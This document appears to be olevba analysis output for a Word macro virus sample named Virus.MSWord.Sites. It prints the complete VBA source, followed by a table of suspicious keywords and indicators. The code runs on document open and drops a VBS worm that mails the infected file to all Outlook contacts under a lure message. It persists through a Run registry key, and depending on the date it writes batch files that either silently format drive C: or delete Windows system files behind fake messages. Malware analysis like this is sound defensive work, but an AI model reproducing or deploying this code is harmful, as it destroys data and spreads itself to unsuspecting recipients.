olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sites
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sites - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hybris.bas 
in file: Virus.MSWord.Sites - OLE stream: 'Macros/VBA/Hybris'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

Sub AutoOpen()

Dim subb, unk, out, m, s, body, doc, bbb, tye, gg, eee As String
Dim rrrw As Long

eee = "Scripting.FileSystemObject"
unk = "WScript.Shell"
out = "Outlook.Application"
m = "MAPI"
s = " HKEY_CURRENT_USER\Software\Microsoft\Wab "
subb = "Some Intresting Site..."
body = "Hey, Here are a document with many new intresting web site... take a look. Bye"
bbb = "sites.doc"
tye = "HKEY_CURRENT_USER\Software\Microsoft\WAB\"
gg = "REG_DWORD"
Me1 = ActiveDocument.Path
Me2 = ActiveDocument.Name
RT = Me1 & "\" + Me2

rrrw = CopyFile(RT, "C:\Windows\System\sites.doc", "4")
Open "C:\Windows\System32.vbs" For Output As #1
Print #1, "'VBS.Sites2k.Worm  By Dr.T/Xmorfic"
Print #1, "main ()"
Print #1, ""
Print #1, "sub main()"
Print #1, "On Error Resume Next"
Print #1, "Dim fso, dirsystem"
Print #1, "Set fso = CreateObject(" + Chr(34) + eee + Chr(34) + ")"
Print #1, "Set dirsystem = fso.GetSpecialFolder(1)"
Print #1, "call semail()"
Print #1, ""
Print #1, ""
Print #1, "sub semail()"
Print #1, "On Error Resume Next"
Print #1, "Dim rrg, lista, a, x, wab, maild, liste, lista"
Print #1, "Set rrg = CreateObject(" + Chr(34) + unk + Chr(34) + ")"
Print #1, "Set spread = WScript.CreateObject(" + Chr(34) + out + Chr(34) + ")"
Print #1, "Set mapi = spread.GetNameSpace(" + Chr(34) + m + Chr(34) + ")"
Print #1, "For lista = 1 To mapi.AddresList.Count"
Print #1, "Set a = mapi.AddressList.Count(lista)"
Print #1, "x = 1"
Print #1, "wab = rrg.RegRead(" + Chr(34) + s + Chr(34) + "& a)"
Print #1, "If (wab = " + Chr(34) + Chr(34) + ") Then"
Print #1, "wab = 1"
Print #1, "End If"
Print #1, "If (Int(a.AddressEntries.Count) > Int(wab)) Then"
Print #1, "For liste = 1 To a.AddressEntries.Count"
Print #1, "maild = a.AddressEntries(x)"
Print #1, "regad =" + Chr(34) + Chr(34)
Print #1, "regad = rrg.RegRead(" + Chr(34) + s + Chr(34) + "& maild)"
Print #1, "If (regad = " + Chr(34) + Chr(34) + ") Then"
Print #1, "Set mail = out.CreateItem(0)"
Print #1, "mail.Recipients.Add (maild)"
Print #1, "mail.Subject =" + Chr(34) + subb + Chr(34)
Print #1, "mail.Body = vbCrLf &" + Chr(34) + body + Chr(34)
Print #1, "mail.Attachments.Add (dirsystem &" + Chr(34) + "\" + bbb + Chr(34) + ")"
Print #1, "mail.Send"
Print #1, "rrg.RegWrite " + Chr(34) + tye + Chr(34) + "& maild,1," + Chr(34) + gg + Chr(34)
Print #1, "End If"
Print #1, "x = x + 1"
Print #1, "Next"
Print #1, "rrg.RegWrite " + Chr(34) + s + Chr(34) + "&a,a.AddressEntries.Count"
Print #1, "Else"
Print #1, "rrg.RegWrite " + Chr(34) + s + Chr(34) + " & a, a.AddressEntries.Count "
Print #1, "End If"
Print #1, "Next"
Print #1, "Set out = Nothing"
Print #1, "Set mapi = Nothing"
Print #1, "End Sub"
Close #1

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WinVBS") <> "C:\Windows\System32.vbs" Then
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WinVBS") = "C:\Windows\System32.vbs"
End If
If Day(1) Or Day(29) Then
    Open "C:\Windows\reg.bat" For Output As #1
    Print #1, "@echo off"
    Print #1, "ctty nul"
    Print #1, "format c: /autotest /q /u"
    Print #1, "Done!!"
    Close #1
    
    Kill "C:\Autoexec.bat"
    Open "C:\Autoexec.bat" For Output As #1
    Print #1, "@echo off"
    Print #1, "cd ..\windows"
    Print #1, "reg.bat"
    Close #1
    
Else
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "echo Windows Registry Checking...."
Print #1, "echo Started checking registry..."
Print #1, "del C:\Windows\Command\Ansi.sys"
Print #1, "del C:\Windows\Command\attrib.exe"
Print #1, "del C:\Windows\Command\Bootdisk.bat"
Print #1, "del C:\Windows\Command\Display.sys"
Print #1, "del C:\Windows\Command\Keyboard.sys"
Print #1, "del C:\Windows\System\Wsock32.dll"
Print #1, "del C:\Windows\System\Wsock2.vxd"
Print #1, "del C:\Windows\System\Vmm32.vxd"
Print #1, "echo No errors found !"
Close #1
End If

ret = MsgBox("Unable to open the current document. The problem may be connected to kernel32.dll", vbCritical)
If ret = vbOK Then
ActiveDocument.Close
End If


End Sub
Sub HelpAbout()
MsgBox "This program performed an illegal operation at 0x02338288:0x0001002", vbCritical
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |System32.vbs        |Executable file name                         |
|IOC       |reg.bat             |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |attrib.exe          |Executable file name                         |
|IOC       |Bootdisk.bat        |Executable file name                         |
|IOC       |Wsock32.dll         |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

